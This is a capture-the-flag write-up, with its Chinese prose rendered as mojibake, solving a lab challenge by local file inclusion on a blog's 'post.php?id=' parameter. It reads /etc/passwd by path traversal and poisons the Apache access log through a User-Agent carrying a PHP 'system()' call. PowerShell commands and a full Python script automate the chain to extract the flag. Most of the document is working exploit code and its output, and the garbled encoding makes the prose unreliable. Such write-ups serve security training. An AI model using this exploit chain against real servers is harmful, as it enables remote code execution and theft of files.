### 1. é¢˜ç›®æè¿°

ç›®æ ‡æ˜¯åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„ `/FLAG.php` æ–‡ä»¶ã€‚è¯¥åšå®¢ç½‘ç«™å­˜åœ¨åŠ¨æ€æ–‡ä»¶åŒ…å«åŠŸèƒ½ï¼Œä½†æœªåšå®‰å…¨é˜²æŠ¤ï¼Œå¯é€šè¿‡æ„é€ è·¯å¾„å®ç°æ–‡ä»¶åŒ…å«ï¼Œä¸”å›  PHP æ–‡ä»¶è¢«å¼•æ“æ‰§è¡Œæ— æ³•ç›´æ¥æŸ¥çœ‹å†…å®¹ï¼Œéœ€ç»“åˆæ—¥å¿—æŠ•æ¯’æŠ€æœ¯è·å– flagã€‚

### 2. çŸ¥è¯†ç‚¹

- æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´åŸç†
- æ—¥å¿—æŠ•æ¯’æŠ€æœ¯ï¼ˆåˆ©ç”¨ User-Agent æ³¨å…¥æ¶æ„ä»£ç ï¼‰
- PHP ä¼ªåè®®åŸºç¡€ï¼ˆè™½å°è¯•å¤±è´¥ï¼Œä½†å±äºç›¸å…³çŸ¥è¯†ç‚¹ï¼‰
- è‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™ï¼ˆPython/ PowerShellï¼‰

### 3. é¢˜ç›®è§£é¢˜æ–¹æ³•æ€è·¯

æ ¸å¿ƒè·¯å¾„ä¸ºâ€œéªŒè¯ LFI æ¼æ´â†’æ—¥å¿—æŠ•æ¯’æ³¨å…¥æ¶æ„ä»£ç â†’åŒ…å«æ—¥å¿—è§¦å‘ä»£ç æ‰§è¡Œâ†’æå– flagâ€ã€‚å…ˆé€šè¿‡æ„é€  `../../../../../../../etc/passwd`â€‹ è·¯å¾„éªŒè¯ LFI æ¼æ´å­˜åœ¨ï¼›å› ç›´æ¥åŒ…å« `/FLAG.php`â€‹ ä¼šè¢« PHP æ‰§è¡Œæ— è¾“å‡ºï¼Œæ•…é€šè¿‡ä¿®æ”¹ User-Agent æ³¨å…¥ `<?php system('cat /FLAG.php'); ?>` åˆ° Apache è®¿é—®æ—¥å¿—ï¼›å†åŒ…å«æ—¥å¿—æ–‡ä»¶è§¦å‘ä»£ç æ‰§è¡Œï¼Œæœ€åä»æ—¥å¿—ä¸­æœç´¢ flagã€‚å·¥å…·å¯ä½¿ç”¨æµè§ˆå™¨éªŒè¯æ¼æ´ï¼ŒPowerShell ä¸‹è½½æ—¥å¿—ï¼ŒPython ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬ã€‚

### 4. è§£é¢˜æ­¥éª¤

1. è®¿é—®ç›®æ ‡é¡µé¢ `http://ip32823`â€‹ï¼Œç‚¹å‡»ä»»æ„ç½‘é¡µï¼Œå‘ç° URL å« `post.php?id=xx.php`â€‹ï¼Œç¡®å®š `id` å‚æ•°ä¸º LFI æ³¨å…¥ç‚¹ã€‚

2. æ„é€ è·¯å¾„éªŒè¯æ¼æ´ï¼šåœ¨ URL åæ‹¼æ¥ `../../../../../../../etc/passwd`â€‹ï¼Œè®¿é—®åé¡µé¢æ˜¾ç¤º `/etc/passwd`â€‹ å†…å®¹ï¼Œç¡®è®¤ LFI æ¼æ´å­˜åœ¨ã€‚![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12104109-wmw6bv6.png)

3. å°è¯•ç›´æ¥åŒ…å«ç›®æ ‡æ–‡ä»¶ï¼šæ‹¼æ¥ `../../../../../../../FLAG.php`â€‹ï¼Œè®¿é—®åé¡µé¢ç©ºç™½ï¼Œå›  PHP æ–‡ä»¶è¢«æœåŠ¡å™¨æ‰§è¡Œï¼Œå†…å®¹æœªè¾“å‡ºã€‚![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12162602-gv5lzf9.png)

4. å°è¯•ä½¿ç”¨ php ä¼ªåè®®ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥ã€‚

   ![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12164725-cdnguqo.png)

5. æ—¥å¿—æŠ•æ¯’æ“ä½œï¼ˆPowerShellï¼‰ï¼š

   - æ‰§è¡Œå‘½ä»¤ä¸‹è½½ Apache è®¿é—®æ—¥å¿—ï¼š`Invoke-WebRequest -Uri "http://ip32823/post.php?id=../../../../../var/log/apache2/access.log" -OutFile access_check.log`â€‹ï¼Œç¡®è®¤æ—¥å¿—å¯è®¿é—®ã€‚![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12163238-vb2lr8f.png)
   - æ³¨å…¥æ¶æ„ä»£ç åˆ°æ—¥å¿—ï¼š`Invoke-WebRequest -Uri "http://ip32823/" -UserAgent "<?php system('cat /FLAG.php'); ?>"`â€‹ã€‚![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12163356-n1h7zgj.png)

6. é‡æ–°ä¸‹è½½æ—¥å¿—ï¼š`Invoke-WebRequest -Uri "http://ip32823/post.php?id=../../../../../var/log/apache2/access.log" -OutFile access_final.log`ã€‚

7. æœç´¢ flagï¼šæ‰§è¡Œ `Get-Content access_final.log | Select-String -Pattern "FLAG"`â€‹ï¼Œä»æ—¥å¿—ç»“æœä¸­æå– flagã€‚![image](D:\05-dev_home\AI_Pentest\xbowé¢˜è§£çŸ¥è¯†åº“\åŒå­¦ä»¬è§£çš„é¢˜\x-bow markdown\new\X-061-24\exp.assets\image-x12163448-pmx3pqr.png)

8. ï¼ˆå¯é€‰ï¼‰è‡ªåŠ¨åŒ–æ‰§è¡Œï¼šè¿è¡Œ Python è„šæœ¬ï¼Œè„šæœ¬ä¼šè‡ªåŠ¨å®Œæˆâ€œéªŒè¯æ—¥å¿—å¯è®¿é—®â†’æ³¨å…¥ä»£ç â†’åŒ…å«æ—¥å¿—â†’æœç´¢ flagâ€å…¨æµç¨‹ï¼Œç›´æ¥è¾“å‡º flagã€‚

   â€


### 5. exp

#### ï¼ˆ1ï¼‰PowerShell å‘½ä»¤ï¼ˆæ‰‹åŠ¨æ“ä½œï¼‰

```powershell
# ä¸‹è½½æ—¥å¿—éªŒè¯å¯è®¿é—®æ€§
Invoke-WebRequest -Uri "http://ip32823/post.php?id=../../../../../var/log/apache2/access.log" -OutFile access_check.log

# æ³¨å…¥æ¶æ„ä»£ç åˆ°æ—¥å¿—
Invoke-WebRequest -Uri "http://ip32823/" -UserAgent "<?php system('cat /FLAG.php'); ?>"

# é‡æ–°ä¸‹è½½æ—¥å¿—
Invoke-WebRequest -Uri "http://ip32823/post.php?id=../../../../../var/log/apache2/access.log" -OutFile access_final.log

# æœç´¢ flag
Get-Content access_final.log | Select-String -Pattern "FLAG"
```

#### ï¼ˆ2ï¼‰Python è‡ªåŠ¨åŒ–è„šæœ¬

```python
#!/usr/bin/env python3

import requests
import re
import time

# é…ç½®
TARGET_URL = "http://ip32823"
LOG_PATH = "../../../../../var/log/apache2/access.log"
FLAG_FILE = "/FLAG.php"


def main():
    print("LFI + Log Poisoning è‡ªåŠ¨åŒ–æ”»å‡»")
    print("=" * 40)
    
    # æ­¥éª¤ 1: æ£€æŸ¥æ—¥å¿—å¯è®¿é—®
    print("\n[1] æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¯è®¿é—®æ€§...")
    try:
        url = f"{TARGET_URL}/post.php?id={LOG_PATH}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"âœ“ æ—¥å¿—å¯è®¿é—®ï¼Œå¤§å°: {len(response.content)} å­—èŠ‚")
        else:
            print(f"âœ— è®¿é—®å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return
    except Exception as e:
        print(f"âœ— é”™è¯¯: {e}")
        return
    
    # æ­¥éª¤ 2: æ³¨å…¥ PHP ä»£ç 
    print("\n[2] æ³¨å…¥ PHP ä»£ç åˆ°æ—¥å¿—...")
    payload = f"<?php system('cat {FLAG_FILE}'); ?>"
    headers = {'User-Agent': payload}
    
    try:
        response = requests.get(TARGET_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"âœ“ ä»£ç å·²æ³¨å…¥: {payload}")
            print("ç­‰å¾… 1 ç§’...")
            time.sleep(1)
        else:
            print(f"âœ— æ³¨å…¥å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return
    except Exception as e:
        print(f"âœ— æ³¨å…¥é”™è¯¯: {e}")
        return
    
    # æ­¥éª¤ 3: è§¦å‘æ‰§è¡Œå¹¶è·å– flag
    print("\n[3] è§¦å‘æ—¥å¿—åŒ…å«ï¼Œæ‰§è¡Œä»£ç ...")
    try:
        url = f"{TARGET_URL}/post.php?id={LOG_PATH}"
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200:
            print("âœ“ æ—¥å¿—å·²åŒ…å«ï¼Œæœç´¢ flag...")
            
            # æœç´¢ flag
            flag_pattern = r'FLAG\{[^}]+\}'
            matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
            
            if matches:
                print("\nğŸ¯ æ‰¾åˆ° Flag!")
                print("=" * 40)
                for flag in set(matches):
                    print(f"Flag: {flag}")
                print("=" * 40)
            else:
                print("âœ— æœªæ‰¾åˆ° flagï¼Œæ˜¾ç¤ºæ—¥å¿—æœ«å°¾:")
                print(response.text[-300:])
        else:
            print(f"âœ— åŒ…å«å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
    except Exception as e:
        print(f"âœ— æ‰§è¡Œé”™è¯¯: {e}")


if __name__ == "__main__":
    main()

```

```powershell
LFI + Log Poisoning è‡ªåŠ¨åŒ–æ”»å‡»
========================================

[1] æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¯è®¿é—®æ€§...
âœ“ æ—¥å¿—å¯è®¿é—®ï¼Œå¤§å°: 10473454 å­—èŠ‚

[2] æ³¨å…¥ PHP ä»£ç åˆ°æ—¥å¿—...
âœ“ ä»£ç å·²æ³¨å…¥: <?php system('cat /FLAG.php'); ?>
ç­‰å¾… 1 ç§’...

[3] è§¦å‘æ—¥å¿—åŒ…å«ï¼Œæ‰§è¡Œä»£ç ...
âœ“ æ—¥å¿—å·²åŒ…å«ï¼Œæœç´¢ flag...

ğŸ¯ æ‰¾åˆ° Flag!
========================================
Flag: FLAG
========================================
```

# 